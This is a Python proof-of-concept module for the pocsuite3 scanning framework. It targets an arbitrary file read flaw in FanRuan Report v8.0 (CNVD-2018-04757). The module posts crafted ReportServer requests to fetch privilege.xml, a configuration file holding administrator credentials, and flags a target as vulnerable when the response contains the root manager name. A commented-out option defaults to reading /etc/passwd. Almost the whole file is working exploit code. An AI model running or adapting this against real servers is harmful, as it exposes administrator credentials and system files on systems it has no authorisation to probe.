#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import os
from urllib.parse import urljoin
minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2023-03-23'
    createDate = '2023-03-23'
    updateDate = '2023-03-23'
    references = []
    name = '帆软报表v8.0任意文件读取漏洞(CNVD-2018-04757)'
    appPowerLink = ''
    appName = ''
    appVersion = 'V8.0'
    vulType = 'Arbitrary File Read'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    severity='high'
    # def _options(self):
    #     o = OrderedDict()
    #     o['filepath'] = OptString('/etc/passwd', description='The full path to the file to read')
    #     return o

    def _exploit(self):
        # if not self._check(dork=''):
        #     return False

        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payloads = ["/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml", "/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"]
        res=''
        for payload in payloads:
            response = requests.post(self.url, headers=headers, data=payload)
            logger.debug(response.text)
            res+=response.text
        return res

    def _verify(self):
        result = {}
        res = self._exploit()
        if res and '<rootManagerName>' in res and '<![CDATA]>' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
        return self.parse_output(result)

    # def _attack(self):
    #     result = {}
    #     param = self.get_option('filepath')
    #     res = self._exploit(param)
    #     result['VerifyInfo'] = {}
    #     result['VerifyInfo']['URL'] = self.url
    #     result['VerifyInfo'][param] = res
    #     return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
